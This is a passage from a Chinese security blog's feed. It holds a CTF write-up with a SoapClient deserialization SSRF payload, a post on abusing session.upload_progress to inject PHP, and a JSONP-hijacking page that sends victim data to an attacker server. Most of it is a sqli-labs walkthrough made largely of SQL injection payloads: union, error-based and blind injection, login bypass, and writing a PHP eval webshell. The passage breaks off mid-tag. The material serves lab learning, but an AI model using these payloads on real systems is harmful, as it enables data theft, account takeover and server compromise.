class="line">4</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">echo &apos;only localhost can get flag!&apos;;</span><br><span class="line">$flag = &apos;LCTF&#123;*************************&#125;&apos;;if ($_SERVER[&quot;REMOTE_ADDR&quot;] === &quot;127.0.0.1&quot;) &#123;$_SESSION[&apos;flag&apos;] = $flag;&#125;</span><br></pre></td></tr></table></figure></p><p>题目意思就是需要通过本地ip来访问flag.php，大体思路就是制造SSRF。<br>通过<code>session_start</code>和<code>call_user_func</code>我们可以利用前一题的思路，利用<code>session_start</code>的参数<code>serialize_handler=php_serialize</code>使得传入和解析session方式不同，就能制造出session反序列化漏洞</p><p>那么构造什么类，可以利用php内置类SoapClient来进行SSRF攻击，触发SSRF，需要类中的<code>__call</code>函数来触发，而要触发<code>__call</code>需要访问类中不存在的方法</p><p>如何访问不存在的方法，需要第二次请求，利用第一个<code>call_user_func</code>进行变量覆盖，将<code>$b</code>覆盖为<code>call_user_func</code>来访问方法，而将<code>$_SESSION[name]</code>赋值为<code>SoapClient</code>就能够对该对象的静态方法<code>welcome_to_the_lctf2018</code>进行访问，实际是对<code>__call</code>函数访问。</p><p>第一次请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.104/t/830/bestphp/?name=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A39%3A%22http%3A%2F%2F127.0.0.1%2Ft%2F830%2Fbestphp%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3D2bijd8knc92gvbfjrhs34tr2v2%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;f=session_start</span><br><span class="line"></span><br><span class="line">serialize_handler=php_serialize</span><br></pre></td></tr></table></figure></p><p>第二次请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.104/t/830/bestphp/?name=Soapclient&amp;f=extract</span><br><span class="line">b=call_user_func</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;bestphp&quot;&gt;&lt;a href=&quot;#bestphp&quot; class=&quot;headerlink&quot; title=&quot;bestphp&quot;&gt;&lt;/a&gt;bestphp&lt;/h2&gt;&lt;p&gt;考点：变量覆盖+lfi+session文件转移&lt;br&gt;代码：&lt;br&gt;&lt;figure class=&quot;h
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>session.upload_progress的利用</title>
    <link href="http://yoursite.com/2019/08/30/session.upload_progress%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/08/30/session.upload_progress的利用/</id>
    <published>2019-08-30T05:24:16.000Z</published>
    <updated>2019-08-30T05:24:16.937Z</updated>
    
    <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>session.upload_progress 是PHP5.4的新特征<br>当<code>session.upload_progress.enabled</code>选项开启时，PHP能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。<br>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得。 当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是<code>session.upload_progress.prefix</code>与<code>session.upload_progress.name</code>连接在一起的值</p><h2 id="设置session-upload-progress"><a href="#设置session-upload-progress" class="headerlink" title="设置session.upload_progress"></a>设置session.upload_progress</h2><p>修改php.ini<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled = On</span><br><span class="line">session.upload_progress.cleanup = On</span><br><span class="line">session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure></p><p>cleanup的值为On时表示上传完后会删除session中的值，Off则不会，如果为On需要通过条件竞争来攻击。</p><h2 id="适用目标"><a href="#适用目标" class="headerlink" title="适用目标"></a>适用目标</h2><p>如果网站开启phpinfo，如果发现<code>session.upload_progress.enabled = On</code>，那么即可对session文件的索引字段进行控制，间接控制session文件，如果存在文件包含漏洞，那么可以获得目标shell。</p><h2 id="实验效果"><a href="#实验效果" class="headerlink" title="实验效果"></a>实验效果</h2><p>构造attack.html进行post上传控制session文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://127.0.0.1/t/830/test.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?= phpinfo(); ?&gt;&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;demo&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><p>查看后台session文件，可以发现session已被我们间接控制<br><img src="/img/1567142601524.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress" target="_blank" rel="noopener">https://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress</a><br><a href="https://blog.csdn.net/koastal/article/details/52980757" target="_blank" rel="noopener">https://blog.csdn.net/koastal/article/details/52980757</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h2&gt;&lt;p&gt;session.upload_progress 是PHP5.4的新特征&lt;br&gt;当&lt;code&gt;session.upload_progress.
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>跨域实现-jsonp和CORS</title>
    <link href="http://yoursite.com/2019/08/23/%E8%B7%A8%E5%9F%9F%E5%AE%9E%E7%8E%B0-jsonp%E5%92%8CCORS/"/>
    <id>http://yoursite.com/2019/08/23/跨域实现-jsonp和CORS/</id>
    <published>2019-08-23T15:50:43.000Z</published>
    <updated>2019-08-23T15:52:39.849Z</updated>
    
    <content type="html"><![CDATA[<h2 id="同源策略-SOP"><a href="#同源策略-SOP" class="headerlink" title="同源策略(SOP)"></a>同源策略(SOP)</h2><p>同源策略限制了同一个源于另一个源的脚本交互。<br>一般同源策略必须满足三个条件：</p><blockquote><p>1、协议相同<br>2、域名相同<br>3、端口相同</p></blockquote><h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><p>许多html标签都能够跨域发出请求，如：img、a、script等，jsonp就是利用了script标签src属性的特性进行动态获取json数据。<br>jsonp客户端需要写一个函数，称为回调函数，通过服务器端触发调用，参数为所传递的json数据，服务器端返回明文如<code>jsonp({&#39;id&#39;:1,&#39;name&#39;:&#39;kage&#39;})</code>的调用字符串。</p><p>具体看代码：<br>用户登录验证：<br>只有登录才能访问该jsonp接口，一定程度防止越权访问，所以需要csrf来触发。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$name = $_GET[&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">$pwd = $_GET[&apos;pwd&apos;];</span><br><span class="line"></span><br><span class="line">if ($name === &apos;admin&apos; &amp;&amp; $pwd === &apos;admin&apos; || $name === &apos;guest&apos; &amp;&amp; $pwd === &apos;guest&apos;) &#123;</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;name&apos;] = $name;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;a&gt;用户信息&lt;/a&gt;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;a&gt;退出登录&lt;/a&gt;&lt;br data-tomark-pass&gt;&apos;;</span><br><span class="line"></span><br><span class="line">if (!$_SESSION[&apos;name&apos;]) &#123;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;登录&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;login.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line"></span><br><span class="line">用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line"></span><br><span class="line">密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;login&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">echo &quot;欢迎您&quot; . $_SESSION[&apos;name&apos;] . &quot;&lt;br data-tomark-pass&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>服务器端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$callback = $_GET[&apos;callback&apos;];</span><br><span class="line"></span><br><span class="line">if ($_SESSION[&apos;name&apos;] === &apos;admin&apos;) &#123;</span><br><span class="line"></span><br><span class="line">echo $callback . &quot;(&#123;&apos;id&apos;:1,&apos;name&apos;:&apos;missfresh_admin&apos;&#125;)&quot;;</span><br><span class="line"></span><br><span class="line">&#125; elseif ($_SESSION[&apos;name&apos;] === &apos;guest&apos;) &#123;</span><br><span class="line"></span><br><span class="line">echo $callback . &quot;(&#123;&apos;id&apos;:2,&apos;name&apos;:&apos;missfresh_guest&apos;&#125;)&quot;;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">echo $callback . &quot;获取个人信息失败&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>构造csrf恶意网站，发送请求到该jsonp接口，劫取用户信息到我们服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;jsonp劫持&lt;/title&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function jsonp_hack(v)&#123;</span><br><span class="line">alert(&quot;jsonp劫持&quot;);</span><br><span class="line">var h=&apos;&apos;;</span><br><span class="line">for(var key in v)&#123;</span><br><span class="line">var a=&apos;&apos;</span><br><span class="line">a=key+&apos; : &apos;+v[key]+&apos; ,&apos;</span><br><span class="line">h+=a</span><br><span class="line">&#125;</span><br><span class="line">alert(h);</span><br><span class="line">$.get(&apos;http://192.168.169.149/get.php?value=&apos;+h);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://192.168.1.6/t/823/message.php?callback=jsonp_hack&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;jsonp劫持&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><h3 id="jsonp劫持原理"><a href="#jsonp劫持原理" class="headerlink" title="jsonp劫持原理"></a>jsonp劫持原理</h3><p>用户点击攻击者链接，通过script标签访问jsonp接口，jsonp回调函数处理取得的json数据，将数据变为字符串，通过ajax发送到攻击者服务器，达到窃取用户个人信息的目的。</p><h2 id="CORS跨域请求"><a href="#CORS跨域请求" class="headerlink" title="CORS跨域请求"></a>CORS跨域请求</h2><p>简单说就是，AJAX的跨域请求化。<br>CORS客户端浏览器都支持，主要需要服务器端返回头的支持。<br>浏览器会判断返回包AC验证字段来决定是否拦截请求。<br>关键字段如下：</p><blockquote><p>Access-Control-Allow-Origin：指定客户端哪些域能访问我的资源<br>Access-Control-Allow-Credentials：浏览器是否发送cookie<br>Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法，比较少</p></blockquote><p>CORS实现：</p><blockquote><p>请求头把所在域添加到Origin中<br>服务器添加Access-Control-Allow-Origin，返回结果<br>浏览器比较Origin和ACAO，如果获得授权，将结果返回给页面</p></blockquote><p>实战：<br>server.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">header(&apos;Access-Control-Allow-Origin: *&apos;);</span><br><span class="line"></span><br><span class="line">header(&apos;Access-Control-Allow-Credentials: true&apos;);</span><br><span class="line"></span><br><span class="line">$a = !empty($_GET[&apos;a&apos;]) ? trim($_GET[&apos;a&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if ($a == &apos;getUserInfo&apos;) &#123;</span><br><span class="line"></span><br><span class="line">echo json_encode(array(</span><br><span class="line"></span><br><span class="line">&apos;uid&apos; =&gt; 1,</span><br><span class="line"></span><br><span class="line">&apos;name&apos; =&gt; &apos;测试&apos;,</span><br><span class="line"></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">echo &apos;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>user.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html lang=&quot;zh-cn&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;cors-test&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div &gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line"></span><br><span class="line">var url = &quot;http://192.168.169.149/server.php&quot;;</span><br><span class="line"></span><br><span class="line">$.get(url, &#123;a:&quot;getUserInfo&quot;&#125;, function(data) &#123;</span><br><span class="line"></span><br><span class="line">alert(data.name)</span><br><span class="line"></span><br><span class="line">&#125;, &quot;json&quot;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>浅谈跨域威胁与安全：<br><a href="https://www.freebuf.com/articles/web/208672.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/208672.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;同源策略-SOP&quot;&gt;&lt;a href=&quot;#同源策略-SOP&quot; class=&quot;headerlink&quot; title=&quot;同源策略(SOP)&quot;&gt;&lt;/a&gt;同源策略(SOP)&lt;/h2&gt;&lt;p&gt;同源策略限制了同一个源于另一个源的脚本交互。&lt;br&gt;一般同源策略必须满足三个条件：&lt;/p
      
    
    </summary>
    
      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs 通关1</title>
    <link href="http://yoursite.com/2019/08/23/sqli-labs%20%E9%80%9A%E5%85%B31/"/>
    <id>http://yoursite.com/2019/08/23/sqli-labs 通关1/</id>
    <published>2019-08-23T15:48:49.000Z</published>
    <updated>2019-08-23T15:48:49.413Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><strong>union 注入</strong><br>1.插入转义字符查看报错<br><code>1\</code><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’ LIMIT 0,1’ at line 1<br>通过报错可以看到id是用什么包裹的</p><p>1.and判断是否存在注入<br><code>1&#39; and 1=1 %23</code><br><code>1&#39; and 1=2 %23</code><br><code>`1&#39; %26%26 1=2 %23</code></p><p>2.order by判断字段数<br>因为union注入，必须和前面查询的字段数相同<br><code>1&#39; order by 3 %23</code><br>从大到小依次测试，直到显示成功</p><p>3.判断回显位置<br><code>-1&#39; union select 1,2,3 %23</code><br>查询的id号的记录必须为空，才能回显我们自己构造的数据</p><p>4.查数据库<br><code>-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata%23</code><br>从information_schema数据库中的shcemata表中的schema_name字段查询出所有的数据库名</p><p>5.查表<br><code>-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code><br>从information_schema数据库中的tables表中的table_name字段查询出所有的表名</p><p>6.查字段<br><code>-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23</code><br>从information_schema数据库中的columns表中的column_name字段查询出所有的字段名</p><p>7.查数据<br><code>id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users%23</code><br>查询出所有数据<br><code>?id=-1&#39; union select 1,username,password from security.users limit 0,1%23</code><br>单个数据查询</p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>与第一关类似，区别在于id不用加单引号<br><code>?id=-1 union select 1,username,password from security.users limit 2,1%23</code></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>与第一关类似，区别在于id用(‘’)包裹<br><code>-1&#39;) union select 1,username,password from security.users limit 0,1%23</code></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>与第一关类似，区别在于id用(“”)包裹<br><code>?id=-1&quot;) union select 1,username,password from security.users limit 0,1%23</code></p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p><strong>可以报错的盲注</strong><br><strong>报错注入：</strong><br>1.报错可以查看包裹字符为<code>&#39;</code><br><code>1\</code></p><p>2.and判断包裹字符确实为<code>&#39;</code><br><code>1&#39; and 1=1 %23</code></p><p>3.order by判断字段<br><code>1&#39; order by 3 %23</code></p><p>4.报错注入<br>注意报错注入依然用union，所以前后字段数需要相同<br>payload1:<br><code>1&#39; union select 1 from (select 1,count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %23</code></p><p>payload2:<br><code>1&#39; union select 1 from (select 1,count(*),3 from information_schema.tables group by concat(database(),floor(rand(0)*2)))b %23</code><br>该payload只是payload1的简化</p><p>payload3:<br><code>1&#39; union select 1 from (select 1,count(*),3 from (select 1 union select null union select !1) as a group by concat(database(),floor(rand(0)*2)))b %23</code><br>当关键表被禁用可以用这个形式，如information.tables</p><p>payload4:<br><code>1&#39; union select 1 from (select min(@a:=1) from information_schema.tables group by concat(database(),@a:=(@a+1)%2))b %23</code><br><code>+</code>号需要url编码，当count(*)和rand()被禁用，可以用该payload</p><p>payload5:<br><code>1&#39; union select 1,extractvalue(1,concat(0x7e,(select database()),0x7e)),2 %23</code><br>extractvalue触发xpath报错注入</p><p>payload6:<br><code>1&#39; union select 1,updatexml(1,concat(0x7e,(select database()),0x7e),1),2 %23</code><br>updatexml触发xpath报错注入</p><p>payload7:<br><code>1&#39; union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x %23</code><br>该payload暂时只知道用来查版本</p><p><strong>布尔盲注：</strong><br>1.报错可以查看包裹字符为<code>&#39;</code><br><code>1\</code></p><p>2.and判断包裹字符确实为<code>&#39;</code><br><code>1&#39; and 1=1 %23</code></p><p>3.order by判断字段<br><code>1&#39; order by 3 %23</code></p><p>4.ascii和substr配合查询</p><blockquote><p>ascii：转换为ascii码<br>substr：substr(查询值,1,1)查询第一个字符</p></blockquote><p><code>1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;0 %23</code><br>id值必须为有效字段，通过判断and后面的bool值来猜出数据的多少，true就显示数据，false就不显示数据</p><p>5.编写python脚本爆数据<br>(select schema_name from information_schema.schemata limit 0,1)</p><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>与第五关类似，区别在于id用<code>&quot;&quot;</code>包裹<br><code>1&quot; and ascii(substr(database(),1,1))&gt;0 %23</code></p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p><strong>无报错回显的布尔盲注</strong><br>1.插入单引号和双引号<br>单引号报错，双引号不报错，可以判断有单引号包裹<br>2.构造判断语句<br><code>1&#39; and 1=1 %23</code><br>依然报错<br><code>1&#39;)) and 1=1 %23</code><br>不报错<br>可以判断id由<code>((&#39;&#39;))</code>包裹<br>3.写脚本爆数据<br>4.使用<code>into outfile</code><br>先测试<br><code>1&#39;)) and (select count(*) from mysql.user)&gt;0 %23</code><br>显然有权限，然后写入文件<br><code>-1&#39;)) union select 1,&#39;&lt;?php @eval($_post[mima])?&gt;&#39;,3 into outfile &quot;D:\\1.php&quot; %23</code><br>前提，需要知道web文件目录，然后使用菜刀连接，就可以获得shell</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>与第七关类似，区别在于id用<code>&#39;&#39;</code>包裹</p><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p><strong>时间注入</strong></p><ol><li>通过sleep判断id由什么包裹<br><code>1&#39; and sleep(3) %23</code><br>延迟3秒才加载完成，可以判断id由<code>&#39;&#39;</code>包裹</li></ol><p>2.通过if函数进行判断</p><blockquote><p>if(bool,执行True,执行False)</p></blockquote><p>所以构造payload<br><code>1&#39; and if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;0,sleep(3),1) %23</code><br>延迟3秒，注入成功。</p><p>3.编写脚本爆数据</p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>与第九关类似，区别在于id用<code>&quot;&quot;</code>包裹</p><h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p><strong>POST类型的union注入</strong><br><strong>登录</strong><br>1.猜测语句<br><code>select * from users where username=&#39;?&#39; and password=&#39;?&#39; %23</code><br>2.在username插入<code>\</code>报错<br>可以判断username和password用<code>&#39;&#39;</code>包裹<br>3.判断是否正确<br><code>uname=1&#39; or 1=1 %23&amp;passwd=</code><br><code>uname=1&#39; or 1=2 %23&amp;passwd=</code><br>通过回显可以判断包裹<br>4.一句话登录<br>如果知道用户名，不用密码可以任意登录<br><code>uname=Dumb&#39; %23&amp;passwd=</code><br>不用用户名和密码，登录任意指定号数的用户<br><code>uname=1&#39; or 1=1 limit 0,1%23&amp;passwd=</code></p><p><strong>爆数据</strong><br>1.判断字段<br><code>uname=1&#39; order by 2%23&amp;passwd=</code><br>2.判断回显位置<br><code>uname=1&#39; union select 1,2%23&amp;passwd=</code><br>3.爆数据<br>payload:<code>uname=1&#39; union select database(),2%23&amp;passwd=</code></p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><p>与第十一关类似，区别在于id用<code>(&quot;&quot;)</code>包裹<br><code>uname=1&quot;) union select database(),2%23&amp;passwd=</code></p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><p><strong>数据不回显，但是报错的POST注入</strong><br>登录与第十一关类似<br><strong>爆数据</strong><br>报错爆数据<br><code>uname=1&#39;) union select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23&amp;passwd=</code><br>通过该语句写脚本爆数据<br><code>uname=1&#39;) or bool 23&amp;passwd=</code></p><h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><p>与第十三关类似，区别在于id用<code>&quot;&quot;</code>包裹<br><code>uname=1&quot; union select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23&amp;passwd=</code></p><h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><p><strong>最像登录的一关，无报错，无回显</strong><br>1.判断id用什么包裹<br><code>uname=1&#39; or 1=1 %23&amp;passwd=</code><br>可以发现id用<code>&#39;&#39;</code>包裹<br>2.通过bool写脚本爆数据</p><h2 id="第十六关"><a href="#第十六关" 